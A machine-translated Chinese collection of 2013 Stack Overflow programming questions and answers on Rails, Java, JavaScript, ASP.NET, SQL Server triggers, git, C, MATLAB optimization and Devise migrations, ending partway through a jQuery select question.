# ruby-on-rails - accept_nested_attributes_for 在控制器方法之前运行

> ID：15936528
> 
> 赞同：1
> 
> 时间：2013-04-10T21:12:51.200
> 
> 标签：ruby-on-rails, nested-attributes

我有一个莫名其妙的问题。我有一个 LineItem 模型，它接受 Trackable 和 Product 的嵌套属性。我正在覆盖默认的 trackable_attributes= 和 product_attributes= 方法，以允许我查找或初始化记录。例如：

```
def trackable_attributes=(attributes)
  _trackable = Project.find_or_initialize_by_id(attributes.delete("id"))
  _trackable.attributes = attributes
  self.trackable = _trackable
end 
```

当我发布到 LineItemController#create 时，即使其中只有一个日志记录语句，它也会运行所有发布的参数，就好像我正在尝试构建/创建一个新的行项目一样。我没有任何 before_filters 可以在 #create 方法上执行此操作。

```
def create
  logger.info("LineItemsController#create")
end 
```

网络服务器日志：

```
Started POST "/line_items" for 127.0.0.1 at 2013-04-10 14:02:13 -0700
Processing by LineItemsController#create as JS
  Parameters: {"utf8"=>"✓", "authenticity_token"=>"MY_SECRET_TOKEN", "line_item"=>{"trackable_type"=>"Project", "tax_rate"=>"0", "price"=>"0.00", "provided_on_formatted"=>"Apr 10", "trackable_attributes"=>{"company_attributes"=>{"id"=>"87", "name"=>"Handmade Design"}, "id"=>"45", "name"=>"MEdia Blitz"}, "product_attributes"=>{"id"=>"75"}, "name"=>"Design", "notes"=>"Yellow", "quantity"=>"0.00", "unit_price"=>"205.0"}, "commit"=>"+"}
Person Load (0.3ms)  SELECT "people".* FROM "people" WHERE "people"."id" = 73 LIMIT 1
(0.1ms)  begin transaction
(0.4ms)  UPDATE "people" SET "last_request_at" = '2013-04-10 21:02:13.861629', "perishable_token" = 'kzsB5dnCOHfykO1XMMi9', "updated_at" = '2013-04-10 21:02:13.863622' WHERE "people"."id" = 73
[paperclip] Saving attachments.
(1.2ms)  commit transaction
Account Load (0.2ms)  SELECT "accounts".* FROM "accounts" WHERE "accounts"."id" = 369 LIMIT 1
Person Load (0.3ms)  SELECT "people".* FROM "people" WHERE "people"."account_id" = 369 ORDER BY id LIMIT 1
{"company_attributes"=>{"id"=>"87", "name"=>"Handmade Design"}, "id"=>"45", "name"=>"MEdia Blitz"}
Project Load (0.2ms)  SELECT "projects".* FROM "projects" WHERE "projects"."id" = 45 LIMIT 1
Company Load (0.2ms)  SELECT "companies".* FROM "companies" WHERE "companies"."id" = 87 LIMIT 1
trackable_attributes=(attributes)
trackable assigned
{"id"=>"75"}
  Product Load (0.2ms)  SELECT "products".* FROM "products" WHERE "products"."id" = 75 LIMIT 1
product_attributes=(attributes)
product assigned
LineItemsController#create 
```

请注意，我有许多日志语句分散在我的自定义 accept_nested_attributes_for 设置器中，这些设置器甚至在 #create 方法开始之前就被调用了。

这是正常的吗？当我想在我的 LineItemsController#create 方法中以正常方式实例化新的 line_item 时，它似乎会导致问题。

我真的很感激任何帮助，因为我不知道从哪里开始。

# java - 按降序递归插入链表

> ID：15936531
> 
> 赞同：-3
> 
> 时间：2013-04-10T21:13:00.143
> 
> 标签：java, recursion, linked-list

我正在学习 java 并尝试实现 Java 'LinkedList' insertList 方法。我希望它以递归方式并按降序工作。我正在关注一本书的教程，但我被困在这一点上。我现在有以下代码，但无法正常工作。任何人都可以给我一些建议吗？

比如说，我们想将 1、3、9、0、5 插入到“LinkedList”中。运行代码后，'LinkedList'中应该是9、5、3、1、0。

```
public class ListElement {
    int value
    ListElement next;
}

public static ListElement InsertList(ListElement head, ListElement elem) { 

    if(head == null){
        elem.next = head;
        return elem;
    }
    else{
        if(elem.value > head.value){
        elem.next = InsertList(elem, head.next);
    }else{
        elem.next = InsertList(head.next, elem);
    }
        return head;
    }
} 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-04-10T21:27:17.513

您的代码有几个问题。考试

```
 if(elem.next > head){ 
```

不应该编译，因为`>`没有为对象定义运算符。似乎你的递归没有基本情况——你在所有情况下都递归，这将导致堆栈溢出。最后，应该插入一个值，而不是`ListElement`. 试试这个（我重命名了方法`insertList`以符合 Java 编码约定）：

```
public static ListElement insertList(ListElement head, int value) { 
    ListElement elt;
    if (head == null || head.value <= value) {
        elt = new ListElement();
        elt.value = value;
        elt.next = head;
        return elt;
     } else {
        head.next = insertList(head.next, value);
        return head;
     }
} 
```

插入值而不是 a 的优点`ListElement`是您可以从客户端代码中隐藏列表的实现。此外，由于 a`ListElement`可能是整个列表，因此插入 a`ListElement`可能会出现意外行为。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-04-10T21:28:09.777

首先，这并不是很重要，但是 java 约定强制方法​​以小写字母开头。

其次，也许你想调用 insertList（你自己的函数）而不是 insert，这使得函数递归和合理。

第三，您必须比较值：

```
if (head == null || elem.value > head.value){
    elem.next = head;
    return elem;
}
else {
    head.next = insertList(head.next, elem);
    return head;
} 
```

这意味着：如果 head 为 null 或小于 elem，则在开头插入 elem；否则，将其插入列表的继续。

# javascript - JavaScript + fireEvent（'onchange'）的无效参数错误

> ID：15936537
> 
> 赞同：1
> 
> 时间：2013-04-10T21:13:28.300
> 
> 标签：javascript, javascript-events

一些简单的事件驱动代码。无论出于何种原因，我似乎都无法将“onchange”作为参数传递给 fireEvent()。在 ie 7/8 中给我一个无效的参数错误。这个项目需要是原生的。一点帮助？

**自定义事件创建：**

```
 createCustomEvent : function(eventName) {
        var evt;
        if(document.createEvent) {
            evt = document.createEvent('CustomEvent');
            evt.initEvent(eventName, true, true);
        }else if(document.createEventObject) {
            evt = document.createEventObject();
            evt.eventName = eventName;
        }
        return evt;
    },
    dispatchCustomEvent : function (el, evt) {
        if(el.dispatchEvent) {
            el.dispatchEvent(evt);
        }else if(el.fireEvent) {
            console.log('on'+evt.eventName); //onchange
            el.fireEvent('on'+evt.eventName, evt);
        }
    } 
```

**用法：**

```
dispatchCustomEvent(element, createCustomEvent('change')); 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-12T12:25:21.183

好的，所以根据大多数文档，*更改*事件将在任何元素上触发，我引用：“当元素失去焦点并且其值在获得焦点后发生更改时触发更改事件。*”*

[https://developer.mozilla.org/en-US/docs/DOM/Mozilla_Event_Reference/change](https://developer.mozilla.org/en-US/docs/DOM/Mozilla_Event_Reference/change)

但是，在 <= ie8 中，*onchange*不会在表单元素之外的任何元素上触发。这是令人难以置信的跛脚 imo，并使现代 MVC 自定义事件的侦听和调度成为一个问题。

长话短说，在我的例子中，我使用了*blur*事件来捕获对我的 div 元素的更改。这对我有用，因为在 div 元素更新之间删除了焦点。这是一个幻灯片应用程序，其中两个 div 弹出和弹出堆栈，从左到右取决于当前位置。

# javascript - Tablesorter -> 将过滤后的数据提取到 csv 文件

> ID：15936538
> 
> 赞同：1
> 
> 时间：2013-04-10T21:13:27.633
> 
> 标签：javascript, jquery, jquery-plugins, tablesorter

我想通过 tablesorter 插件将过滤的记录写入 csv 格式的外部文件。我正在关注Tablesorter 插件的创建者[Mottie的](https://stackoverflow.com/users/145346/mottie)[这个答案](https://stackoverflow.com/questions/14655988/extracting-filtered-table-data)。在 FireBug 错误控制台中，我收到错误消息

**TypeError: $(...).on 不是函数 $('.export').on('click', function(){**

这是我的文件，使用 tablesorter 以 csv 格式提取记录，

```
<%@page import="java.util.Iterator"%>
<%@page import="java.util.ArrayList"%>
<%    
    ArrayList<ArrayList<String>> resultsetlist = (ArrayList<ArrayList<String>>) request.getAttribute("SearchRecordsList");        
%>
<%@page contentType="text/html" pageEncoding="UTF-8"%>
<!DOCTYPE html>
<html>
    <head>
        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">       
        <meta charset="utf-8">
        <title>Research Records</title>       
        <!-- jQuery -->
        <script src="http://ajax.googleapis.com/ajax/libs/jquery/1.4/jquery.js"></script>
        <!-- Demo stuff -->
        <link class="ui-theme" rel="stylesheet" href="http://ajax.googleapis.com/ajax/libs/jqueryui/1.8/themes/cupertino/jquery-ui.css">
        <script src="http://ajax.googleapis.com/ajax/libs/jqueryui/1.7/jquery-ui.min.js"></script>       
        <link href="js/tablesorter/docs/css/prettify.css" rel="stylesheet">
        <script src="js/tablesorter/docs/js/prettify.js"></script>
        <script src="js/tablesorter/docs/js/docs.js"></script>
        <!-- Tablesorter: required -->
        <link rel="stylesheet" href="js/tablesorter/css/theme.blue.css">
        <script src="js/tablesorter/js/jquery.tablesorter.js"></script>
        <script src="js/tablesorter/js/jquery.tablesorter.widgets.js"></script>
        <script>
            $(function() {                
                $('table').tablesorter({
                    theme : 'blue',
                    widgets: ['zebra', 'filter' ]
                });
            });

            $('.exportcsv').on('click', function(){
                var csv = [];
                // find only visible rows; we're ignoring filtered/hidden rows
                $('table').find('tbody tr:visible').find('td').each(function(){
                    alert("Value of text" + $(this).text());                                    
                    csv.push( $(this).text());                    
                });
                // do what you want with the csv data here
                $('textarea').val( csv.join(',') )
            });            
        </script>            
        <link rel="stylesheet" type="text/css" href="stylesheet1.css">       
        <title>JSP Page</title>
    </head>
    <body>       
        <table class="tablesorter" id="tablesorter-id-variable">
            <thead>
                <tr>
                    <%
                        int index = 0;
                        String s = "null";
                        Iterator itrcol = resultsetlist.iterator();
                        if (itrcol.hasNext()) {
                            ArrayList<String> col_record = (ArrayList<String>) itrcol.next();
                            for (index = 0; index < col_record.size(); index++) {
                                s = col_record.get(index);
                    %>
                    <th>
                        <% out.println(s);%>
                    </th>
                    <%
                        } // End of -for-
                    %>
                </tr>
                <%
                    } //end if
                %>
            </thead>
            <tbody>
                <tr>
                    <%
                        Iterator itr = resultsetlist.iterator();
                        itr.next();
                        while (itr.hasNext()) {
                            ArrayList<String> each_record = (ArrayList<String>) itr.next();                            
                            for (index = 0; index < each_record.size(); index++) {
                                s = each_record.get(index);
                    %>
                    <td>
                        <% out.println(s);%>                        
                    </td>
                    <%
                        } // End of -for-
                    %>
                </tr>
                <%
                    } //end while
                %>
            </tbody>
        </table>
        <button class="exportcsv">export csv</button><br>
        <textarea cols="40" rows="10"></textarea>
    </body>
</html> 
```

上面的代码中可能出现什么错误？提前致谢 ：）

**更新：解决方案**

两个答案都是对的！很遗憾我只能接受一个:(

问题是我使用的 Jquery 版本与 1.4 一样旧。所以将它升级到最新的 google cdn's - 1.8 ，解决了这个问题。感谢答案:)

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-04-10T21:36:51.447

使用新版本的 jQuery，因为 $()​​.on 仅在 jQuery 1.7+ 中可用，而您使用的是 jQuery 1.4。

```
<script src="//ajax.googleapis.com/ajax/libs/jquery/1.7.0/jquery.min.js"></script> 
```

您可以将其用于安全性，许多 javascript 库默认使用 $。在这个 .ready() 中，$ 指的是 jQuery 对象。

```
jQuery(document).ready(function($) {
        $(function() {                
            $('table').tablesorter({
                theme : 'blue',
                widgets: ['zebra', 'filter' ]
            });
        });

        $('.exportcsv').on('click', function(){
            var csv = [];
            // find only visible rows; we're ignoring filtered/hidden rows
            $('table').find('tbody tr:visible').find('td').each(function(){
                alert("Value of text" + $(this).text());                                    
                csv.push( $(this).text());                    
            });
            // do what you want with the csv data here
            $('textarea').val( csv.join(',') )
        });
}); 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-04-12T04:07:54.037

jQuery v1.4 没有`on()`函数，改用它来`bind()`代替。

```
$('.exportcsv').bind('click', function(){ 
```

或者将您正在使用的 jQuery 版本更新到 1.7+ 版本

# c# - 变量传递空值

> ID：15936543
> 
> 赞同：0
> 
> 时间：2013-04-10T21:13:34.840
> 
> 标签：c#, asp.net, visual-studio, session

我尝试设置会话值，但每次我想显示用户在上一页中输入的文本时，它都会返回 null

我有三个页面订阅者详细信息，包裹选择和银行详细信息，所有三个页面相互跟随，并且用户已经用他/她想要的信息填写了所有页面并单击下一步，他们被定向到显示他们输入的所有信息的页面.

我似乎也看不出我做错了什么？

订阅者详细信息.aspx

```
protected void Button1_Click(object sender, EventArgs e)
{
    string FullName = txtFullName.Text;
    string CompanyName = txtCompanyName.Text;
    string Vat = txtVAT.Text;
    string ContactNumber = txtContactNumber.Text;
    string Fax = txtFax.Text;
    string District = txtDistrict.Text;
    string Street = txtStreet.Text;
    string City = txtCity.Text;
    string Code = txtPostal.Text;
    string Trading = txtTrading.Text;
    string Id = txtID.Text;
    string ContactPerson = txtContactPerson.Text;
    string Email = txtEmail.Text;

        Session["FullName"] = FullName;
        Session["CompanyName"] = CompanyName;
        Session["VAT"] = Vat;
        Session["ContactNumber"] = ContactNumber;
        Session["Fax"] = Fax;
        Session["District"] = District;
        Session["City"] = City;
        Session["Street"] = Street;
        Session["Code"] = Code;
        Session["Trading"] = Trading;
        Session["ID"] = txtID.Text;
        Session["ContactPerson"] = ContactPerson;
        Session["Email"] = Email;

} 
```

最终的.aspx

```
protected void Page_Load(object sender, EventArgs e)
{
    if (string.IsNullOrEmpty((string)Session["Fullname"]))
    {
        lblFullName.Text = "N/A";
    }
    else
    {
        lblFullName.Text = Session["FullName"].ToString();
    }
    if (string.IsNullOrEmpty((string)Session["CompanyName"]))
    {
        lblCompanyName.Text = "N/A";
    }
    else
    {
        lblCompanyName.Text = Session["CompanyName"].ToString();
    }
    if (string.IsNullOrEmpty((string)Session["VAT"]))
    {
        lblVat.Text = "N/A";
    }
    else
    {
        lblVat.Text = Session["VAT"].ToString();
    }
    if (string.IsNullOrEmpty((string)Session["ContactNumber"]))
    {
        lblContactNumber.Text = "N/A";
    }
    else
    {
        lblContactNumber.Text = Session["ContactNumber"].ToString();
    }
    if (string.IsNullOrEmpty((string)Session["Fax"]))
    {
        lblFax.Text = "N/A";
    }
    else
    {
        lblFax.Text = Session["Fax"].ToString();
    }
    if (string.IsNullOrEmpty((string)Session["District"]))
    {
        lblDistrict.Text = "N/A";
    }
    else
    {
        lblDistrict.Text = Session["District"].ToString();
    }
    if (string.IsNullOrEmpty((string)Session["Street"]))
    {
        lblStreet.Text = "N/A";
    }
    else
    {
    lblStreet.Text = Session["Street"].ToString();
    }
    if (string.IsNullOrEmpty((string)Session["City"]))
    {
        lblCity.Text = "N/A";
    }
    else
    {
        lblCity.Text = Session["City"].ToString();
    }
    if (string.IsNullOrEmpty((string)Session["Code"]))
    {
        lblCode.Text = "N/A";
    }
    else
    {
    lblCode.Text = Session["Code"].ToString();
    }
    if (string.IsNullOrEmpty((string)Session["Trading"]))
    {
        lblTrading.Text = "N/A";
    }
    else
    {
    lblTrading.Text = Session["Trading"].ToString();
    }
    if (string.IsNullOrEmpty((string)Session["ID"]))
    {
        lblID.Text = "N/A";
    }
    else
    {
    lblID.Text = Session["ID"].ToString();
    }
    if (string.IsNullOrEmpty((string)Session["ContactPerson"]))
    {
        lblContactPerson.Text = "N/A";
    }
    else
    {
    lblContactPerson.Text = Session["ContactPerson"].ToString();
    }
    if (string.IsNullOrEmpty((string)Session["Email"]))
    {
        lblMail.Text = "N/A";
    }
    else
    {
    lblMail.Text = Session["Email"].ToString();
    }
} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-10T21:16:31.733

好吧，您那里没有太多选择，如果发生这种情况，您的会话就有问题。也许每个其他请求都在启动一个新会话，请检查以确保它没有发生。

检查：

```
Session.SessionID; 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-10T21:22:36.937

我看到一段代码使用`TextBox`控件，而较低的代码使用`Label`控件。

你不是，也许，读错了，是吗？

这仅供参考：如果我们填写“N/A”之类的值，我们会在我们的网站上收到客户投诉。大多数人似乎更喜欢看到空格，这也将简化您的代码：

```
lblVariable.Text = string.Format("{0}", Session["Variable"]); 
```

显然，变量需要随您的 Session 和 Control 变量名称而改变。

# sql - 创建只影响特定行的 SQL 触发器

> ID：15936559
> 
> 赞同：0
> 
> 时间：2013-04-10T21:14:32.353
> 
> 标签：sql, sql-server-2008

我有两个表创建了库存和 customer_sales。在仓库中工作的个人无权访问 customer_sales 表。

因此，我在库存表中添加了一个名为 num_sales 的附加字段。

我想创建一个触发函数，每当添加新客户销售时。它将对应于已售出的特定inventory_item 行而不是整个表。

这就是我到目前为止所拥有的。

```
ALTER TABLE inventory 
ADD num_sales INT 

UPDATE movies SET num_sales = 0;

ALTER TABLE movies ALTER COLUMN num_rentals INT NOT NULL;

GO
CREATE TRIGGER tr_movies_num_rentals_add
   ON customer_sales FOR INSERT
   AS
   BEGIN
     UPDATE inventory
       SET num_sales = num_sales + (SELECT sale_status_code FROM INSERTED)
       WHERE 1 = (SELECT sale_status_code FROM INSERTED);
   END; 
```

注意：sale_status_code 值：1=已售出，2=保留，3=丢失。

更新：我正在使用 Microsoft SQL 服务器管理工​​作室。我是新手，这是我对学校的一个问题。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-10T21:59:23.727

首先假设插入将有多行。SQL Server 触发器不会逐行操作。您需要加入以插入不使用子查询。接下来，如果您希望在插入、更新和删除时发生这种情况，那么您需要使用的不仅仅是 INSert 触发器。并且删除触发器应该使用与插入和更新不同的公式，因为您将从库存总额中减去已删除表中的值。

# python - unittest - 发生错误

> ID：15936562
> 
> 赞同：0
> 
> 时间：2013-04-10T21:14:45.033
> 
> 标签：python

当我尝试在 Ninja-IDE 中运行这个单元测试时：

```
import Node
import unittest

class TestNode(unittest.TestCase):

    def test_creation(self):
        self.testedInstance = Node(1)
        self.assertIsNotNone(testedInstance)

if __name__ == '__main__':
    unittest.main() 
```

我收到此错误：

> 在 0.001 秒内运行 1 次测试
> 
> 失败（错误=1）
> 
> 执行成功！

文件节点.py：

```
class Node:

    def __init__(self, init_value):
        self.value = init_value 
```

如果我将测试主体更改为`self.assertTrue(1)`，则错误消失。

对不起我的英语不好。

谢谢

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-04-10T21:15:35.280

`testedInstance`没有定义。你的意思是`self.testedInstance`？

```
def test_creation(self):
    self.testedInstance = Node(1)
    self.assertIsNotNone(self.testedInstance) 
```

还是您的意思是创建`Node`本地命名空间？

```
def test_creation(self):
    testedInstance = Node(1)
    self.assertIsNotNone(testedInstance) 
```

# git - Git 从本地仓库推送到原点

> ID：15936563
> 
> 赞同：2
> 
> 时间：2013-04-10T21:14:49.167
> 
> 标签：git

我需要问这个问题，但方法可能很简单，但是我尝试搜索答案，而谷歌结果都指向我一个不起作用的答案。

我目前的设置是

```
git branch -r
  origin/HEAD -> origin/master
  origin/master

git branch
* m1
  master
  remote 
```

我使用 got checkout -br m1 创建了 m1 作为 repo

我在 m1 本地分支中进行所有更改，而不是我掌握，因此我在我的 pom.xml 中进行了一些更改并提交它，如下所示。

```
 git log --graph --stat origin/master..
* commit c44d62aecef8bef168cc60303ef36dab47117428
  Author: Yatin
  Date:   Wed Apr 10 13:38:44 2013 -0700

      fixing error in pom.xml

   map_reduce/pom.xml |   14 ++++++--------
   1 files changed, 6 insertions(+), 8 deletions(-) 
```

我想将我在 m1 本地 repo 中所做的更改推送到原点，我已经尝试过了

```
git push origin m1 
```

这基本上创建了一个名为 m1 的新远程仓库。我不想创建一个名为 m1 的远程仓库，而只是将 m1 中的更改推送到原点。我错过了一些基本的概念，但不确定它是什么。有人能告诉我怎么做吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-10T21:21:14.550

您没有远程指定您想要哪个分支，因此它假定为 origin/m1。

尝试

```
git push origin m1:master 
```

语法是

```
git push remote local_branch:remote_branch 
```

# c - 错误：预期标识符或带有 C 数组声明的 '('

> ID：15936564
> 
> 赞同：-1
> 
> 时间：2013-04-10T21:14:59.900
> 
> 标签：c, gcc, syntax-error

在我的头文件中，我有一个声明 MEMORY_SIZE 变量的语句。然后我想使用 MEMORY_SIZE 作为数组的大小创建两个数组。这是我的头文件代码：

```
#ifndef MEMORY_SIZE
#define MEMORY_SIZE 1024*512
#endif 
```

在我的主文件中，我用于缓冲区的代码是：

```
//buffers
unsigned char [MEMORY_SIZE] memBytes;
unsigned char [MEMORY_SIZE] secBytes; 
```

之后，当我使用 gcc 编译时，我收到消息“错误：预期标识符或两个数组的“（”）。稍后在代码中，当我尝试使用数组时，我得到“错误：使用未声明的标识符 'memBytes '"

有人看到这个问题吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-10T21:16:05.657

问题是您正在使用 C 编译器编译 Java。

```
unsigned char memBytes[MEMORY_SIZE]; 
```

~~认真地拿一本C书。~~（看来你做到了。在这种情况下，放弃 Java 之一。）

# javascript - 为通知

> ID：15936579
> 
> 赞同：3
> 
> 时间：2013-04-10T21:15:54.733
> 
> 标签：javascript, jquery, forms

好的，首先，我在想这个标题以及在谷歌中搜索什么时遇到了很多麻烦。所以这可能只是我很愚蠢，但这是我希望你帮助的。

我有一个表单，它有一个按钮，可以添加额外的输入字段，但我希望每次按下按钮时都迭代该字段的名称。例如，第一次将是：

```
<input type="textfield" name="field1" value=""/> 
```

然后第二次按下它，它将是：

```
<input type="textfield" name="field2" value=""/> 
```

我还有一个我目前在这里拥有的小例子：http: [//jsfiddle.net/5gh75/14/](http://jsfiddle.net/5gh75/14/)

请让我知道您是否可以帮助我，或者如果您需要更多信息，谢谢:)

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-04-10T21:17:38.373

处理这种情况的最佳方法是全部命名`field[]`。

当由服务器端代码处理时，它将为您构建一个数组。例如，在 PHP 中你会得到`$_POST['field'][0]`，`$_POST['field'][1]`等等。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-04-10T21:20:23.110

对于您的示例：

**jQuery**

```
var i=0;
$('span.add').click(function () {
    $('<input>').attr({
        type: 'textfield',
        name: 'program'+i
    }).appendTo('#addsoftware');
    i++;
}); 
```

[JSF](http://jsfiddle.net/5gh75/17/)中。

但是@Kolink-s 的答案要好得多。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-10T21:22:41.093

编辑：发送后我才看到以前的帖子。使用数组肯定会更好，而且 JQuery 总是很好:)。

只需使用一些javascript：

```
<HTML>
<HEAD>
<TITLE>Dynamically add Textbox, Radio, Button in html Form using JavaScript</TITLE>
<SCRIPT language="javascript">
idx = 0;
function add() {
     //Create an input type dynamically.
     var element = document.createElement("input");

     //Assign different attributes to the element.
     element.setAttribute("type", "textfield");
     element.setAttribute("name", "field" . idx);
     element.setAttribute("value", "");

     idx++;

     var foo = document.getElementById("fooBar");

     //Append the element in page (in span).
     foo.appendChild(element);
}
</SCRIPT>
</HEAD>
<BODY>
<FORM>
<H2>Dynamically add element in form.</H2>
Select the element and hit Add to add it in form.
<BR/>
<INPUT type="button" value="Add" onclick="add()"/>

<span id="fooBar">&nbsp;</span>

</FORM>
</BODY>
</HTML> 
```

这个例子来自：[Add more text fields dynamic in new line (html)](https://stackoverflow.com/questions/12224823/add-more-text-fields-dynamically-in-new-line-html)

# matlab - 在 MatLab 中使用约束最大化函数

> ID：15936582
> 
> 赞同：0
> 
> 时间：2013-04-10T21:16:06.360
> 
> 标签：matlab, optimization, maximize, wolframalpha

我想在 MatLab 中最大化这个功能 - [http://goo.gl/C6pYP](http://goo.gl/C6pYP)

最大化 | 功能 | 3x+6y+9z 域 | 12546975x+525x^2+25314000y+6000y^2+47891250z+33750z^2<=4000000000 | 为| xyz

但变量 x、y 和 z 只能是非负整数。任何想法如何在 MatLab 中实现它？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-10T21:43:45.090

您想要整数的事实使这个问题很难解决（即在合理的时间内无法解决）。

您将不得不使用一些通用优化器，并通过蛮力尝试许多起始条件。您不能保证找到全局最大值。有关更多可能的优化器，请参阅[Matlab 的优化包](http://www.mathworks.com/help/matlab/optimization.html)。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-07-12T13:36:29.980

y 和 z(152,79) 的最大值不是很高，所以我们可以一一检查以快速找到解决方案（在我的笔记本电脑中只需 0.040252 秒）。

我的matlab代码：

```
function [MAX,x_star,y_star,z_star]=stackoverflow1
%maximize 3x+6y+9z
% s.t.    12546975x+525x^2+25314000y+6000y^2+47891250z+33750z^2<=4000000000
MAX=0;
y_max=solver(6000,25314000,-4000000000);
z_max=solver(33750,47891250,-4000000000);
for y=0:floor(y_max)
    for z=0:floor(z_max)
        x=solver(525,12546975,+25314000*y+6000*y^2+47891250*z+33750*z^2-4000000000);
        x=floor(x);
        if isnan(x) || x<0
            break;
        end
        if 3*x+6*y+9*z>MAX
            MAX=3*x+6*y+9*z;
            x_star=x;
            y_star=y;
            z_star=z;
        end
    end
end
end
function val=solver(a,b,c)
% this function solve equation a*x^2+b*x+c=0.
% this equation should have two answers,this function returns the bigger one only.
if b*b-4*a*c>=0
    val=(-b+sqrt(b*b-4*a*c))/(2*a);
else
    val=nan; % have no real number answer.
end
end 
```

解决方案是：

最大值 =

945

x_star =

287

y_star =

```
14 
```

z_star =

```
 0 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-07-12T09:59:07.497

好吧，幸运的是问题规模很小，所以我们可以暴力破解它。

首先得到一些上限，这里是如何为 x 做的：

```
xmax= 0;
while 12546975*xmax+525*xmax^2<=4000000000
    xmax=xmax+1;
end 
```

这为我们提供了所有三个变量的上限。现在我们可以看到这些限制的乘积并不多，所以我们可以尝试所有解决方案。

```
bestval = 0;
for x = 0:xmax
    for y = 0:ymax
        for z = 0:zmax
            val = 3*x+6*y+9*z;
            if val> bestval && 12546975*x+525*x^2+25314000*y+6000*y^2+47891250*z+33750*z^2<=4000000000
                bestval = val;
                best = [x y z];
            end
        end
    end
end
best, bestval 
```

这可能不是最有效的方法，但它应该很容易阅读。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-04-11T08:24:15.340

您必须将问题表述为 ILP（整数线性程序）。要求解 ILP，您需要对 [matlab LP solver](http://www.mathworks.com/discovery/linear-programming.html)的输入进行少量更改。您还可以从 LP 求解器获得解，然后将解四舍五入为整数。该解决方案可能不是最佳的，但会很接近。

您还可以 在文件交换站点使用[混合整数线性编程求解器，该站点又使用 LP 求解器。](http://www.mathworks.com/matlabcentral/fileexchange/6990-mixed-integer-lp)对于二进制变量，您可以使用 matlab[二进制整数编程求解器](http://www.mathworks.com/help/optim/ug/bintprog.html)。

# eclipse - Eclipse 启动异常时激活 Eclipse 插件

> ID：15936586
> 
> 赞同：0
> 
> 时间：2013-04-10T21:16:27.563
> 
> 标签：eclipse, exception, plugins, handler, activation

我想创建一个 Eclipse 插件，它会在 Eclipse 启动异常时自动激活（当 java 程序运行时）。我怎样才能做到这一点？

然后我需要有关启动的异常的信息（名称、类等）。哪个类/包可以给我这些信息？

到目前为止，我只创建了由按钮激活的 Eclipse 插件（简单的 AbstracHandler）。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-11T06:11:13.207

对于未捕获的异常，仅使用非 Eclipse 特定的普通 Java 机制是可能的：您可以使用[Thread.setDefaultUncaughtExceptionHandler](http://docs.oracle.com/javase/1.5.0/docs/api/java/lang/Thread.html#setDefaultUncaughtExceptionHandler%28java.lang.Thread.UncaughtExceptionHandler%29)启用全局处理程序。

也就是说，您可能会通过这样做来破坏 Eclipse 的现有行为。

# ruby-on-rails - 如何删除设计表以运行“rake db:migrate”？

> ID：15936591
> 
> 赞同：0
> 
> 时间：2013-04-10T21:16:55.677
> 
> 标签：ruby-on-rails, devise

我在 Rails 3.2.12 中将设计添加到我的 Web 应用程序中。我跑了一个成功的`$ rails generate devise:install`和`$ rails generate devise User`。

这是我跑步时得到的`$ rake routes`：

```
 new_user_session GET    /users/sign_in(.:format)       devise/sessions#new
             user_session POST   /users/sign_in(.:format)       devise/sessions#create
     destroy_user_session DELETE /users/sign_out(.:format)      devise/sessions#destroy
            user_password POST   /users/password(.:format)      devise/passwords#create
        new_user_password GET    /users/password/new(.:format)  devise/passwords#new
       edit_user_password GET    /users/password/edit(.:format) devise/passwords#edit
                          PUT    /users/password(.:format)      devise/passwords#update
 cancel_user_registration GET    /users/cancel(.:format)        devise/registrations#cancel
        user_registration POST   /users(.:format)               devise/registrations#create
    new_user_registration GET    /users/sign_up(.:format)       devise/registrations#new
   edit_user_registration GET    /users/edit(.:format)          devise/registrations#edit
                          PUT    /users(.:format)               devise/registrations#update
                          DELETE /users(.:format)               devise/registrations#destroy
                     root        /                              pages#home
                    about GET    /about(.:format)               pages#about 
```

当我尝试运行`rake db:migrate`时，出现以下**错误**：

```
 ==  DeviseCreateUsers: migrating ==============================================
 -- create_table(:users)
 rake aborted!
 An error has occurred, this and all later migrations canceled:

 SQLite3::SQLException: table "users" already exists: CREATE TABLE "users" ("id" INTEGER PRIMARY     KEY AUTOINCREMENT NOT NULL, "email" varchar(255) DEFAULT '' NOT NULL, "encrypted_password"    varchar(255) DEFAULT '' NOT NULL, "reset_password_token" varchar(255), "reset_password_sent_at"    datetime, "remember_created_at" datetime, "sign_in_count" integer DEFAULT 0, "current_sign_in_at"    datetime, "last_sign_in_at" datetime, "current_sign_in_ip" varchar(255), "last_sign_in_ip"    varchar(255), "created_at" datetime NOT NULL, "updated_at" datetime NOT NULL)   /Users/andyHuynh/.rvm/gems/ruby-1.9.3-p327/gems/sqlite3-1.3.7/lib/sqlite3/database.rb:91:in    `initialize' 
```

它告诉我我已经有一个“用户”表。如果是这样的话，这个sql表在哪里呢？提前感谢您的帮助！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-10T21:21:26.293

我会查看您以前的迁移，看看是否有一个创建了`users`表的迁移。如果是这样，可能会删除该迁移。无论如何，我会进入您的`rails dbconsole`并手动删除`users`表格，然后`rake db:migrate`再次运行。

# javascript - 单身的有多个选择的选项 我的标签是一个单选下拉，标签的默认行为。我有三个值，“否”，“是”，“全部”。我正在尝试使用以下代码（我使用的是 JQuery 1.9.1）以编程方式更改所选内容，就像我之前做过一千次一样： $('#select').children(':selected').removeAttr ('选择'); $('#select').children('option[value="yes"]').attr('selected', 'selected'); $('#select

> ID：15936592
> 
> 赞同：0
> 
